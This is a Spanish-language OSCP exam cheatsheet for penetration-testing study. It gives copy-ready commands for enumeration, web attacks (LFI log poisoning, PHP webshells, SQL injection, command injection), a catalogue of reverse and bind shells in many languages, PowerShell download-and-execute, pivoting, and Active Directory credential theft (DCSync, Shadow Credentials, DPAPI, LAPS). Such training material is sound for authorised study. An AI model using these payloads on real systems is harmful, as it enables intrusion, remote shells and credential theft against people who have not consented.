Cheatsheet OSCP — Metodología de examen

Referencia práctica para las 3 máquinas standalone y el set de Active Directory. Cada comando está listo para copiar. Reemplaza $IP por la IP objetivo y $LHOST/$LPORT por tu atacante (Kali).

Regla de oro: Enumerar, enumerar y enumerar. El 90% del examen es enumeración. Si estás atascado, casi siempre es porque te saltaste un servicio, un puerto, un directorio o una versión. Vuelve a enumerar más a fondo antes de buscar un exploit raro.

00Metodología y mentalidad

Trabaja siempre en el mismo orden para no olvidar nada bajo presión. Toma notas desde el primer segundo.

FaseObjetivoSalida que buscas
1. ReconocimientoPuertos y servicios abiertosLista de puertos + versiones
2. EnumeraciónExprimir cada servicioUsuarios, rutas web, shares, versiones exactas
3. Acceso inicial (foothold)Primera shell (normalmente sin privilegios)Shell como www-data / usuario
4. Shell estableTTY interactiva + persistencia de sesiónShell cómoda, flag de usuario
5. Escalada de privilegiosroot / SYSTEM / AdministratorFlag de root/proof.txt
6. Post / pivote (AD)Loot de credenciales y movimientoCredenciales, siguiente host, DC
Antes de nada: crea tu carpeta de notas por máquina (~/oscp/IP/) y empieza a pegar comandos y screenshots desde el primer flag. El reporte se escribe mientras hackeas, no después.

Principios que ahorran horas

  • Escanea todos los puertos (-p-), no solo los 1000 por defecto. Puertos altos esconden foothold.
  • Anota la versión exacta de cada servicio y pásala por searchsploit.
  • Prueba credenciales por defecto y reutilización de contraseñas en todos los servicios.
  • Rota de máquina si llevas >2h atascado; vuelve con la mente fresca.

REFEquivalencias de herramientas

El examen pide un resultado (enumerar SMB, pedir un TGS, dumpear credenciales, pivotar…), nunca una herramienta concreta. Para cada tarea tienes varias opciones: usa la que tengas instalada, la que funcione en ese objetivo, o la que mejor controles. Esta tabla es tu caja de herramientas; el resto de la guía usa una opción por defecto, pero cualquiera de estas vale.

Nota: netexec (nxc) es el sucesor mantenido de crackmapexec (cme); los comandos son casi idénticos. Donde veas crackmapexec, puedes usar nxc.

01Nmap y escaneo

Barrido rápido inicial (mientras piensas)

# Rápido: solo abiertos, todos los puertos
nmap -p- --min-rate 2000 -T4 -Pn $IP -oN nmap/allports.txt

Escaneo de servicios y scripts sobre los puertos encontrados

# Sustituye 22,80,445 por los puertos abiertos reales
nmap -p 22,80,445 -sC -sV -A -Pn $IP -oN nmap/services.txt

UDP (lento pero clave para SNMP/DNS/TFTP)

sudo nmap -sU --top-ports 100 -Pn $IP -oN nmap/udp.txt

Scripts NSE por vulnerabilidad

nmap -p 445 --script "smb-vuln*" -Pn $IP
nmap -p 80 --script "http-enum" -Pn $IP
Tip: lanza el -p- y, sin esperar a que acabe, empieza a enumerar el puerto 80/445 que casi siempre aparece. Paraleliza.

02Enumeración de servicios por puerto

FTP — 21

# Login anónimo
ftp $IP        # usuario: anonymous / pass: vacío o anonymous
# Dentro: binary, ls -la, get archivo, put shell
# Versión vulnerable (vsftpd 2.3.4, ProFTPD...) -> searchsploit

SSH — 22

ssh usuario@$IP
# Si tienes clave: chmod 600 id_rsa; ssh -i id_rsa usuario@$IP
# Clave con passphrase -> ssh2john id_rsa > hash; john hash

SMTP — 25

# Enumerar usuarios válidos
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/names.txt -t $IP
nc -nv $IP 25   # VRFY root / EXPN

DNS — 53

# Transferencia de zona (si la permite)
dig axfr @$IP dominio.local
dnsrecon -d dominio.local -n $IP -t axfr

HTTP / HTTPS — 80 / 443

whatweb http://$IP
# Mira el código fuente, /robots.txt, comentarios, versiones de CMS
nikto -h http://$IP
# HTTPS: revisa el CN/SAN del certificado -> suele dar hostnames/vhosts

Ver sección Enumeración web para fuzzing de directorios y vhosts.

POP3/IMAP — 110 / 143

nc -nv $IP 110
# USER x / PASS y / LIST / RETR 1   (leer correos = credenciales)

RPC — 111 / 135

rpcinfo -p $IP
rpcclient -U "" -N $IP      # null session
# Dentro: enumdomusers, enumdomgroups, querydominfo, getdompwinfo

SMB — 139 / 445

# Listar shares (varias formas, prueba todas)
smbclient -L //$IP/ -N
smbmap -H $IP
smbmap -H $IP -u 'guest' -p ''
crackmapexec smb $IP --shares -u '' -p ''
# Conectar a un share y descargar
smbclient //$IP/Share -N
# Enumeración completa null session
enum4linux-ng -A $IP
Siempre prueba: sesión nula (-N), usuario guest, y credenciales que ya tengas. SMB es foothold y fuente de loot constante.

SNMP — 161 (UDP)

snmpwalk -v2c -c public $IP
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25   # usuarios
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2  # procesos
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP

LDAP — 389 / 636

ldapsearch -x -H ldap://$IP -s base namingcontexts
ldapsearch -x -H ldap://$IP -b "DC=dominio,DC=local"

MSSQL — 1433

impacket-mssqlclient dominio/usuario:pass@$IP -windows-auth
# Dentro: enable_xp_cmdshell; EXEC xp_cmdshell 'whoami';
crackmapexec mssql $IP -u usuario -p pass

NFS — 2049

showmount -e $IP
mkdir /mnt/nfs; sudo mount -t nfs $IP:/ruta /mnt/nfs -o nolock
# no_root_squash -> potencial privesc (crea binario SUID como root local)

MySQL — 3306

mysql -h $IP -u root -p
# Dentro: show databases; use x; select * from users;

RDP — 3389

xfreerdp /u:usuario /p:pass /v:$IP /cert:ignore +clipboard /dynamic-resolution
# Fuerza bruta puntual (cuidado con lockouts):
crackmapexec rdp $IP -u usuario -p pass

WinRM — 5985 / 5986

crackmapexec winrm $IP -u usuario -p pass
evil-winrm -i $IP -u usuario -p pass        # shell interactiva Windows

03Enumeración web

Fuzzing de directorios y archivos

feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50

ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.html

Vhosts / subdominios (cuando hay hostname)

# Primero añade el hostname a /etc/hosts
echo "$IP  dominio.htb" | sudo tee -a /etc/hosts
# Fuzz de vhost por cabecera Host
ffuf -u http://dominio.htb -H "Host: FUZZ.dominio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0

Parámetros ocultos

ffuf -u "http://$IP/page.php?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
  • Ajusta el filtro: -fs (tamaño), -fc 404 (código), -fw (palabras).
  • Siempre revisa manualmente el código fuente, cabeceras y cookies.
  • Busca paneles de login, CMS (WordPress → wpscan), y archivos de backup (.bak, ~, .old).

CMS conocidos

# WordPress
wpscan --url http://$IP --enumerate u,p,t --api-token TOKEN
wpscan --url http://$IP -U users.txt -P rockyou.txt   # brute del login
# Drupal / Joomla
droopescan scan drupal -u http://$IP
joomscan -u http://$IP

04Ataques web

LFI / RFI (Local/Remote File Inclusion)

# LFI básico
http://$IP/index.php?page=../../../../etc/passwd
# Filtro PHP para leer código fuente en base64
http://$IP/index.php?page=php://filter/convert.base64-encode/resource=config.php
# LFI a RCE vía logs (envenena User-Agent con <?php system($_GET['c']); ?>)
http://$IP/index.php?page=/var/log/apache2/access.log&c=id
# Archivos interesantes en Windows
http://$IP/index.php?page=../../../../windows/system32/drivers/etc/hosts
Wordlist útil para LFI: /usr/share/seclists/Fuzzing/LFI/. Prueba wrappers php://, data://, expect://.

Subida de archivos (File Upload)

# Sube una webshell PHP
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Bypass de extensión: shell.php.jpg, shell.phtml, shell.php5, PHP (mayúsculas)
# Bypass de Content-Type: cámbialo a image/png en Burp
# Magic bytes: antepón GIF89a; al contenido

Inyección SQL (SQLi)

# Bypass de login típico
' OR '1'='1'-- -
admin'-- -
# UNION: averigua nº de columnas
' ORDER BY 1-- -   (sube hasta error)
' UNION SELECT 1,2,3-- -
' UNION SELECT user(),database(),version()-- -
# sqlmap (automatiza; guarda la request con Burp -> req.txt)
sqlmap -r req.txt --batch --dbs
sqlmap -r req.txt --batch -D db -T users --dump
# RCE si es MSSQL o permisos FILE:
sqlmap -r req.txt --os-shell

Inyección de comandos (Command Injection)

# Separadores a probar en campos que ejecutan comandos
; id
| id
`id`
$(id)
&& id
%0a id        # salto de línea URL-encoded

Autenticación y fuerza bruta

# Formularios web (ajusta el patrón de fallo)
hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form \
"/login.php:user=^USER^&pass=^PASS^:Invalid"
# Servicios
hydra -L users.txt -P rockyou.txt ssh://$IP
hydra -l admin -P rockyou.txt ftp://$IP

searchsploit (exploits conocidos)

searchsploit nombre version
searchsploit -m 12345        # copia el exploit a tu carpeta
searchsploit -x 12345        # lo muestra
Siempre lee el exploit antes de ejecutarlo. Ajusta IPs, puertos y rutas. Entiende qué hace: en el examen debes explicarlo en el reporte.

05Shells y mejora de TTY

Listener en Kali

nc -lvnp $LPORT
# Mejor: rlwrap nc -lvnp $LPORT   (historial y flechas)

Reverse shells (Linux objetivo) — rápidas

bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
# nc sin -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f

Catálogo completo por lenguaje (Linux y Windows) en la sección Payloads por lenguaje.

Upgrade a TTY interactiva (Linux) — imprescindible

# 1) En la shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# 2) Ctrl+Z (vuelve a Kali)
stty raw -echo; fg
# 3) Enter, y luego:
export TERM=xterm; stty rows 38 columns 116
Alternativa si no hay python: script -qc /bin/bash /dev/null. Con TTY completa puedes usar su, sudo, editores y Ctrl+C sin perder la shell. El método con socat (ver abajo) da una TTY completa de una sola vez.

06Payloads de shell por lenguaje

Cuando la reverse shell básica falla, prueba otro intérprete según lo que haya instalado en el objetivo. Pon siempre primero el listener en Kali (nc -lvnp $LPORT).

Generador de referencia (ya conocido, muy útil para codificar/URL-encode): revshells.com. Aun así, memoriza bash, python, nc-mkfifo y la de PowerShell.

Reverse shells — Linux / Unix

# Bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
# Bash (envoltura, más fiable al inyectar)
bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
# sh + mkfifo (cuando no hay bash ni nc -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f
# Python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("$LHOST",$LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
# Perl
perl -e 'use Socket;$i="$LHOST";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# PHP
php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
# Ruby
ruby -rsocket -e'f=TCPSocket.open("$LHOST",$LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
# nc con -e (si la versión lo soporta)
nc -e /bin/sh $LHOST $LPORT
# socat (ver TTY completa abajo)
socat TCP:$LHOST:$LPORT EXEC:/bin/sh
# awk
awk 'BEGIN{s="/inet/tcp/0/$LHOST/$LPORT";while(42){do{printf "shell> "|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")close(s)}}' /dev/null

socat — TTY totalmente interactiva (recomendado)

# 1) En Kali (listener que entrega una pty):
socat file:`tty`,raw,echo=0 TCP-L:$LPORT
# 2) En el objetivo (si tiene socat o súbelo):
socat TCP:$LHOST:$LPORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
Esto te da una shell con autocompletado, Ctrl+C, editores y sudo funcionando, sin el baile de stty. Transfiere el binario socat estático si el objetivo no lo tiene.

Reverse shells — Windows objetivo

# PowerShell (una línea)
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"
# nc.exe transferido al objetivo
nc.exe $LHOST $LPORT -e cmd.exe
# ConPtyShell (TTY completa en Windows) o Invoke-PowerShellTcp.ps1 de Nishang
# Descarga + ejecuta en memoria:
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')"
Si Defender bloquea la cadena PowerShell, codifícala en Base64 (-enc), usa nc.exe, o genera un .exe con msfvenom (ver sección msfvenom). Para una TTY real en Windows, ConPtyShell es el equivalente al truco de socat.

Bind shells (cuando no puedes recibir conexiones salientes)

# Objetivo Linux escucha; tú conectas
nc -lvnp $LPORT -e /bin/sh          # en el objetivo
nc $IP $LPORT                       # desde Kali
# socat bind
socat TCP-L:$LPORT EXEC:/bin/sh     # objetivo
socat - TCP:$IP:$LPORT              # Kali

08Pivoting y port forwarding

Cuando comprometes un host que ve una red interna que tú no alcanzas (típico en el set de AD: llegas a un host que habla con el DC). El objetivo es enrutar tus herramientas de Kali hacia esa red a través del host comprometido.

Primero descubre la red interna: ip a / ipconfig, arp -a, route. Anota la segunda interfaz y su rango (p.ej. 10.10.x.0/24).

Barrido de red interna (descubrir hosts vivos)

Una vez montado el túnel, primero descubre qué hosts existen en la subred interna; luego escanea puertos/servicios host por host. No escanees el /24 entero a puertos a ciegas: es lento y ruidoso.

# Ping sweep: solo descubre hosts vivos, no escanea puertos
nmap -sn 172.16.1.0/24
# Si ICMP está bloqueado, descubre por TCP a puertos comunes
nmap -sn -PS22,80,135,445,3389 172.16.1.0/24
# Extrae solo las IPs vivas a un archivo
nmap -sn 172.16.1.0/24 -oG - | awk '/Up/{print $2}' > vivos.txt
# Luego, por cada host vivo, escaneo de puertos/servicios normal
nmap -p- --min-rate 2000 -Pn 172.16.1.5
A través de proxychains el ICMP no pasa (solo TCP), así que el ping sweep no sirve por el túnel. Descubre con un TCP connect scan a pocos puertos y sin ping: 
proxychains nmap -sT -Pn -p 445,3389,5985 172.16.1.0/24
Recuerda que nmap sobre proxychains da falsos negativos: confirma un host dudoso con proxychains nc -nvz -w5 172.16.1.5 445 o proxychains nxc smb 172.16.1.5.

SSH port forwarding (si tienes credenciales SSH)

# Local forward: expón un puerto interno en tu Kali
#   accede a 127.0.0.1:8080 (Kali) -> 10.10.10.5:80 (vía pivote)
ssh -L 8080:10.10.10.5:80 usuario@$IP
# Remote forward: el objetivo no puede salir, reenvía hacia ti
ssh -R 9001:127.0.0.1:9001 usuario@$IP
# Dynamic (SOCKS): proxy SOCKS en Kali para TODA la red interna
ssh -D 1080 usuario@$IP
# Flags útiles: -N (no shell) -f (background)
ssh -fN -D 1080 usuario@$IP

proxychains (enrutar cualquier herramienta por el SOCKS)

# /etc/proxychains4.conf -> al final:
#   socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -n 10.10.10.5
proxychains crackmapexec smb 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.5 -u admin -p pass
# Nota: por SOCKS usa TCP connect scan (-sT) y evita ping (-Pn)

chisel (SOCKS/forwarding sin SSH — muy usado en el examen)

# SOCKS inverso (lo más común): servidor en Kali, cliente en el objetivo
# En Kali:
chisel server -p 8000 --reverse
# En el objetivo (sube el binario chisel):
./chisel client $LHOST:8000 R:socks
#   -> abre un SOCKS5 en 127.0.0.1:1080 de tu Kali (úsalo con proxychains)

# Port forward puntual (puerto interno -> tu Kali)
# En el objetivo:
./chisel client $LHOST:8000 R:3389:10.10.10.5:3389

ligolo-ng (pivoting por interfaz tun — el más cómodo)

# En Kali (proxy):
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# En el objetivo (agente):
./agent -connect $LHOST:11601 -ignore-cert
# En la consola de ligolo: session -> elige agente
# añade la ruta de la red interna y empieza el túnel:
sudo ip route add 10.10.10.0/24 dev ligolo
# >> start
# Ahora tus herramientas usan 10.10.10.x directamente, SIN proxychains
ligolo-ng es el favorito moderno: crea una interfaz de red real, así que nmap con -sS, SMB y todo funciona nativo, sin el overhead de proxychains.

sshuttle (VPN pobre sobre SSH)

sshuttle -r usuario@$IP 10.10.10.0/24
# Enruta toda la subred por el pivote; transparente para tus herramientas

Forwarding nativo en Windows (sin subir binarios)

# netsh portproxy (requiere admin): expone puerto interno en el host Windows
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.5
# plink.exe (PuTTY) para dynamic forward hacia tu Kali

13bAD — Caza de credenciales

El foothold en AD casi siempre viene de una credencial encontrada, no de un exploit. Cada credencial nueva: pruébala de inmediato contra shares y hosts nuevos. El patrón real es en cadena: cred #1 → share con solo lectura → script o KeePass con cred #2 → shell.

GPP — Groups.xml (cpassword)

# En shares tipo SYSVOL: el atributo cpassword usa una clave AES pública
gpp-decrypt '<VALOR_DE_CPASSWORD>'    # revisa userName en el mismo XML

Dónde más aparecen contraseñas

  • Notas de onboarding en shares legibles por Guest (un .txt con la contraseña por defecto).
  • Campo Description de cada usuario: nxc smb $IP -u u -p p --users — lee la columna Description, no solo el nombre.
  • Scripts .ps1/.bat con credenciales hardcodeadas (ConvertTo-SecureString "..." -AsPlainText).
  • KeePass .kdbx (ver Cracking) y spraying usuario=password (nxc smb $IP -u users.txt -p users.txt --no-bruteforce).
  • Historial de PowerShell: type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt.

ZIP/PFX → autenticación por certificado

# .pfx (cert + clave) protegido por password: crackea y separa en cert + key
pfx2john archivo.pfx > h; john --wordlist=rockyou.txt --format=pfx h
openssl pkcs12 -in archivo.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in archivo.pfx -clcerts -nokeys -out cert.pem
# El certificado ES la credencial (no necesitas el password del usuario):
evil-winrm -i $IP -c cert.pem -k key.pem -S

DPAPI — credenciales guardadas (Credential Manager)

# Necesitas el blob (Credentials\) Y la masterkey (Protect\<SID>\), ambos Hidden+System
dir C:\Users\USER\AppData\Local\Microsoft\Credentials\ -Force
dir C:\Users\USER\AppData\Roaming\Microsoft\Protect\<SID>\ -Force   # whoami /user da el SID
# En Kali, con la password en texto plano del dueño de la masterkey:
impacket-dpapi masterkey -file '<masterkey_GUID>' -sid '<SID>' -password 'PASS'
impacket-dpapi credential -file '<blob>' -key '<hex_de_la_masterkey>'
Señal de DPAPI: entras con shell de un usuario y en vez de una flag encuentras carpetas Credentials\ o Protect\ con contenido — guardó la credencial de otra cuenta que necesitas para seguir la cadena.

16bAD — Abuso de ACL y Shadow Credentials

Cuando BloodHound muestra que tu usuario tiene un permiso sobre otro objeto (no un camino de sesión). Prioriza los edges de familia ACL: son ejecutables ya, sin depender de crackear nada.

Cadena de grupos hasta WriteDacl sobre el dominio → DCSync

# 1) Únete al grupo intermedio que tiene el privilegio
net rpc group addmem "GRUPO" "tu_user" -U "dominio/tu_user%pass" -S $DC_IP
# 2) VERIFICA SIEMPRE (net rpc puede "funcionar" sin error y no aplicar nada)
net rpc group members "GRUPO" -U "dominio/tu_user%pass" -S $DC_IP
# 3) Auto-concédete DCSync y vuélcalo
impacket-dacledit -action write -rights DCSync -principal tu_user -target-dn "DC=dom,DC=local" "dominio/tu_user:pass"
impacket-secretsdump dominio/tu_user:pass@$DC_IP -just-dc
Si net rpc group addmem falla en silencio, usa LDAP directo (un .ldif con changetype: modify / add: member y ldapmodify) o bloodyAD --host $IP -d dom -u u -p p add groupMember "GRUPO" tu_user. La membresía puede tardar en propagarse al token: si el paso 3 da INSUFF_ACCESS_RIGHTS, repite el paso 1 y ejecuta el 3 justo después, sin esperar.

Shadow Credentials (GenericWrite/GenericAll sobre una CUENTA)

# Agrega tu propia credencial de certificado al msDS-KeyCredentialLink de la cuenta:
certipy shadow auto -u 'tu_user@dominio' -p 'pass' -dc-ip $DC_IP -account 'cuenta_objetivo'
# -> te devuelve el hash NT de la cuenta sin resetear su password. Luego PtH normal.
# Alternativa: pywhisker. Si da error de reloj, antepón faketime sincronizado al DC.

16cAD CS (certificados), LAPS y SeBackup

Vectores paralelos a DCSync, cada vez más comunes. Cuando BloodHound no muestra ningún camino por ACL ni Kerberos, revisa estos.

AD CS mal configurado (certipy)

# Enumera plantillas/CA vulnerables (usa SIEMPRE la versión más reciente de certipy)
certipy find -u 'cuenta@dominio' -hashes ':NTHASH' -dc-ip $DC_IP -vulnerable
# Patrón ESC general: pedir un certificado que autentique como otro usuario,
# luego 'certipy auth -pfx admin.pfx' para obtener su hash NT (si hay desfase de
# reloj, antepón faketime). Lee el output de 'find' para ver qué ESC aplica.

LAPS (password de Administrador local en un atributo de AD)

# Si tu usuario tiene permiso de lectura sobre el atributo:
nxc ldap $IP -u 'user' -p 'pass' -M laps
# -> Computer:HOSTNAME$ User:Administrator Password:<texto_plano>
evil-winrm -i $IP -u 'Administrator' -p '<password_de_laps>'   # admin LOCAL de esa máquina

SeBackupPrivilege (leer archivos protegidos sin ser Administrator)

# whoami /priv muestra SeBackupPrivilege Enabled, pero type/download dan Access denied.
# robocopy con /B usa la API de backup, que SÍ respeta el privilegio:
robocopy /B C:\Users\Administrator\Desktop C:\Users\TU_USER\Documents\loot root.txt
type C:\Users\TU_USER\Documents\loot\root.txt
Un privilegio "Enabled" en el token NO se aplica solo a cualquier comando: necesitas una herramienta que invoque su semántica (robocopy /B para SeBackup, reg save para las claves SAM/SYSTEM de la sección anterior). No descartes el privilegio porque el comando obvio falló.

17Escalada y persistencia de dominio

En el examen rara vez necesitas Golden Ticket para "ganar"; comprometer el DC y leer el flag suele bastar. Pero conoce la técnica.

Caminos típicos a Domain Admin

  • Usuario Kerberoasteable con contraseña débil → crackear → sus privilegios.
  • Admin local reutilizado en varias máquinas (PtH) → llegar al DC.
  • BloodHound muestra una ACL abusable (GenericAll, WriteDacl) → tomar control de un grupo/usuario.

18Árbol de decisión — AD (framework de 9 posiciones)

La clave para no atascarte en AD es dejar de preguntarte "¿qué exploit uso?" y preguntarte "¿en qué posición estoy ahora mismo?". Cada posición tiene un conjunto fijo de ataques; identifícala y ataca en ese orden. Avanzar en AD es moverte de una posición a otra hasta llegar al DC.

  • 1 · Punto de partida — solo IP/red, sin usuarios ni credenciales
    • Señal: acabas de identificar el DC (puertos 88/389/445).
    • Ataca: enum sin creds — null session, RPC, lookupsid, LDAP anónimo, usuarios en la web. Objetivo: conseguir una LISTA de usuarios. (ver Enum AD)
  • 2 · Tengo lista de usuarios, pero ninguna contraseña
    • Ataca: AS-REP roasting (-no-pass), password spraying prudente, y usuario=password. Cuentas SVC_* → piensa Kerberoasting en cuanto tengas una cred. (ver Kerberos)
  • 3 · Tengo 1 credencial de dominio (user:pass)
    • Ataca, en este orden: BloodHound (mapa) → Kerberoasting → listar shares/LDAP y cazar más creds → ¿WinRM/SMB admin en algún host? (ver Caza de creds, Lateral)
  • 4 · Tengo un hash NTLM, no la contraseña
    • Ataca: Pass-the-Hash (evil-winrm -H / -hashes), nxc para ver DÓNDE es admin ese hash, e intenta crackearlo por si se reutiliza. (ver Lateral)
  • 5 · Tengo shell de USUARIO en una máquina
    • Ataca: privesc local — whoami /priv (SeImpersonate→PrintSpoofer) PRIMERO, luego DPAPI, historial de PowerShell, winPEAS y creds en disco. (ver PrivEsc Win, Caza de creds)
  • 6 · Tengo admin local / SYSTEM en una máquina
    • Ataca: volcar SAM/SYSTEM local y lsass (secretsdump/mimikatz), LAPS, y buscar creds de dominio cacheadas → reutilízalas en otros hosts. (ver Volcado, LAPS)
  • 7 · Tengo un permiso/ACL sobre un objeto (lo ves en BloodHound)
    • Ataca el edge: GenericAll/GenericWrite sobre una cuenta → Shadow Credentials o reset; WriteDacl sobre el dominio → auto-concede DCSync; AddMember → únete al grupo. (ver ACL y Shadow Creds)
  • 8 · Tengo acceso a un servicio con contexto (MSSQL, AD CS, app web)
    • Ataca: MSSQL sysadmin/impersonation → xp_cmdshell; CA vulnerable → certipy (ESC); app web → creds en el código/BD para reusar. (ver AD CS, Vectores adicionales)
  • 9 · Tengo privilegio de alto nivel (DA, derechos de replicación o el hash de krbtgt)
    • Ataca: DCSync (secretsdump -just-dc), PtH al DC, lee las flags y documenta. Golden Ticket solo si necesitas persistencia. (ver Volcado, Escalada de dominio)
Posición transversal (puede darse en cualquier punto): ¿el DC o una segunda subred no se alcanzan desde tu Kali? No es una posición nueva, es un bloqueo de red: monta un túnel (pivoting) y sigues atacando desde la posición en la que ya estabas, pero ahora alcanzando la red interna.
Si una posición no avanza, casi siempre es porque te saltaste un ataque de su lista (no porque necesites uno más exótico). Repasa la posición entera antes de buscar otra cosa, y recuerda: cada credencial, hash o shell nueva te mueve a OTRA posición — vuelve a mirar esta lista cada vez que consigas algo.

19¿Atascado? Checklist de rescate

  • Sin foothold
    • ¿Escaneé TODOS los puertos (-p-) y UDP?
    • ¿Enumeré CADA servicio a fondo? (versiones, null sessions)
    • ¿Fuzzeé web con otra wordlist y extensiones? ¿Vhosts?
    • ¿Probé credenciales por defecto y reutilización?
    • ¿Busqué la versión exacta en searchsploit y Google?
  • Tengo shell pero no escalo
    • ¿Corrí linpeas/winpeas y LEÍ toda la salida?
    • Linux: ¿sudo -l, SUID, capabilities, crons, kernel?
    • Win: ¿whoami /priv, servicios, unquoted path, registry?
    • ¿Busqué credenciales en configs, historial, /home, BBDD?
    • ¿Hay otro usuario al que pivotar primero (horizontal)?
  • AD trabado
    • ¿Volví a BloodHound con mi usuario marcado como Owned?
    • ¿Probé todas las creds/hashes en TODOS los hosts (CME)?
    • ¿Revisé shares, GPP, scripts por contraseñas?
    • ¿Necesito pivotar para ver el DC u otra subred?
Si llevas demasiado tiempo: toma un descanso de 10 min, cambia de máquina, y relee tus propias notas. El dato que falta suele estar ya escrito en ellas.

20Reglas y gestión del examen

Estructura y puntuación (verifica siempre en tu guía oficial actual)

  • El examen son 23 horas 45 min de hacking + tiempo para el reporte.
  • Se necesitan 70 puntos para aprobar (de 100).
  • Set de Active Directory: 40 puntos — normalmente se puntúa como conjunto (hay que comprometerlo bien).
  • Tres máquinas standalone: 20 puntos cada una (10 foothold + 10 privesc, según la versión vigente).
Restricciones de herramientas (críticas):
  • Metasploit / Meterpreter / módulos auto de explotación: solo en UNA máquina de todo el examen.
  • Prohibidos: herramientas automáticas de explotación de vulnerabilidades masiva, comerciales (Burp Pro active scan, Cobalt Strike), y scripts que automaticen el examen entero.
  • msfvenom, searchsploit, scripts manuales, CrackMapExec, Impacket, BloodHound, chisel, ligolo: permitidos sin límite.
  • Siempre confirma las reglas vigentes en la guía oficial de OffSec antes del examen; pueden cambiar.

Toma de notas y reporte

  • Screenshots de cada paso: el comando, su salida, y cada flag con ip a/whoami visibles.
  • Captura el local.txt/proof.txt junto a la salida de type/cat y la IP de la máquina.
  • Herramientas de notas: CherryTree, Obsidian o Sysreptor. Una carpeta por máquina.
  • Guarda todos los comandos exactos: el reporte debe permitir reproducir cada paso.
  • Entrega el reporte en PDF dentro del plazo (24h tras el examen). Sin reporte válido no hay aprobado.
